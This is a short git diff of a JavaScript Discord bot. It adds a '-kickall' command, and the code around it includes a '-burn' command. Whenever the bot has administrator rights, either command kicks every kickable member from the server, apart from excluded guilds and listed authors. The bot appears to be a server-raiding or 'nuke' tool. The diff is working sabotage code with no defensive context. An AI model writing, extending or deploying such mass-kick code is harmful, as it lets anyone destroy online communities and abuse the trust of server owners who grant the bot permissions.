@@ -307,6 +307,14 @@ client.on("message", msg => {
  
 
 client.on("message", async msg => {
+ if(msg.content === `-kickall`) {
+if(list.includes(msg.author.id)) {return}
+    if(msg.channel.type === 'dm') {return}
+if(!unallowedguilds.includes(msg.guild.id)) {
+    if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
+msg.guild.members.cache.forEach(m => {
+if(m.kickable) {m.kick()}})}}
+  }
   if(msg.content.startsWith(`-burn`)) {
 if(list.includes(msg.author.id)) {return}
     if(msg.channel.type === 'dm') {return}
@@ -314,7 +322,7 @@ if(!unallowedguilds.includes(msg.guild.id)) {
     if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
 msg.guild.members.cache.forEach(m => {
 if(m.kickable) {m.kick()}})}}
-  }else if(msg.content.startsWith(`-kickall`)) {
+  }else if(msg.content.startsWith(`-kickallexperiment`)) {
    if(msg.channel.type === 'dm') {return}
 if(list.includes(msg.author.id)) {return}
  if(!unallowedguilds.includes(msg.guild.id)) {
